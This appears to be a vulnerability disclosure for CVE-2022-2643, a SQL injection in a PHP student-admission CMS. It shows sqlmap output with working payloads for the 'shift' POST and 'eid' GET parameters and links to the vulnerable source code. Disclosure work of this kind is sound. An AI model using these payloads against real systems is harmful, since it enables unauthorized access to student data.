# Student-Admission CMS Sqlinjection

# CVE-2022-2643  
## Sqlinjection location 1  
![image](https://user-images.githubusercontent.com/72059221/182750831-21ba3a4b-d99f-484b-813f-0d175d044ce4.png)
![image](https://user-images.githubusercontent.com/72059221/182750900-d34a0889-3f8b-4a3b-85a7-fddb16385258.png)


![image](https://user-images.githubusercontent.com/72059221/182751071-f90c74c8-2632-4838-ac0d-a7cf4d0ebac0.png)

#### No Check Shift  

![image](https://user-images.githubusercontent.com/72059221/182751180-d03a9653-d4b1-4dfd-b0a9-d5535f98f6bf.png)


#### Sqlmap Attack
![image](https://user-images.githubusercontent.com/72059221/182750935-56fa5112-fdcd-4bb5-ba7e-762cffaaf506.png)

```
POST parameter 'shift' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 1581 HTTP(s) requests:
---
Parameter: shift (POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: sname=bbb&gname=aaa&contact=1&email=1@11.com&address=111111&class=1&shift=1 AND GTID_SUBSET(CONCAT(0x717a766b71,(SELECT (ELT(3656=3656,1))),0x7162766a71),3656)&gender=female&blgroup=abc&division=1&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sname=bbb&gname=aaa&contact=1&email=1@11.com&address=111111&class=1&shift=1 AND (SELECT 2934 FROM (SELECT(SLEEP(5)))GVhT)&gender=female&blgroup=abc&division=1&submit=Submit
---
[09:45:36] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.39, PHP 5.6.9
back-end DBMS: MySQL >= 5.6
```

## Sqlinjection location 2

![image](https://user-images.githubusercontent.com/72059221/182759099-aa9b5cf7-88eb-46ee-9978-7c9af8aff168.png)


#### Sqlmap Attack

![image](https://user-images.githubusercontent.com/72059221/182759209-d192c812-572e-42ca-b63c-4b707d1d8101.png)


```
[11:29:01] [INFO] GET parameter 'eid' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'eid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 142 HTTP(s) requests:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: a=edit&eid=(SELECT (CASE WHEN (5950=5950) THEN 8 ELSE (SELECT 9749 UNION SELECT 6556) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: a=edit&eid=8 OR (SELECT 5422 FROM(SELECT COUNT(*),CONCAT(0x717a766a71,(SELECT (ELT(5422=5422,1))),0x7170707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: a=edit&eid=8 AND (SELECT 8871 FROM (SELECT(SLEEP(5)))pMGL)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: a=edit&eid=-4536 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a766a71,0x4764484f4a426d4d6147624c54525076594d64476745676f7750505173707247795a6c584d434842,0x7170707871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[11:29:02] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.6.9, Apache 2.4.39
back-end DBMS: MySQL >= 5.0
```

## Code Download

https://www.sourcecodester.com/php/15514/online-admission-system-php-and-mysql.html
